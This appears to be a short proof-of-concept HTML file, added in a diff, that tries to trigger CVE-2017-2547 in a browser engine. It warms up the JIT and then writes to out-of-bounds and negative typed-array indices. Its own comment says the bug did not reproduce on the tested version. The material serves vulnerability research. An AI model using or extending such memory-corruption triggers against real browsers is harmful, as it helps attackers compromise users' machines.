@@ -1,0 +1,43 @@
+<!--
+CVE-2017-2547
+Tested on 5.5.1
+Based on example from https://bugs.chromium.org/p/project-zero/issues/detail?id=1220
+Does not appear to be present
+-->
+<script>
+var t;
+function f() {
+    var arr = new Uint32Array(10);
+    var arr2 = new Uint32Array(10);
+    for (var i = 0; i < 0x100000; i++) {
+        parseInt();
+    }
+    arr[7] = 1;
+    arr[0x4] = 2;
+    arr[0x8] = 2;
+    arr[0xC] = 2;
+    arr[0x10] = 2;
+    arr[0x14] = 2;
+    arr[0x1C] = 2;
+    arr[0x20] = 2;
+    arr[0x24] = 2;
+    arr[0x28] = 2;
+    arr[0x2C] = 2;
+    arr[0x30] = 2;
+    arr[-0x4] = 2;
+    arr[-0x8] = 2;
+    arr[-0xC] = 2;
+    arr[-0x10] = 2;
+    arr[-0x14] = 2;
+    arr[-0x1C] = 2;
+    arr[-0x20] = 2;
+    arr[-0x24] = 2;
+    arr[-0x28] = 2;
+    arr[-0x2C] = 2;
+    arr[-0x30] = 2;
+    console.log(arr);
+    console.log(arr2);
+}
+
+f();
+</script>
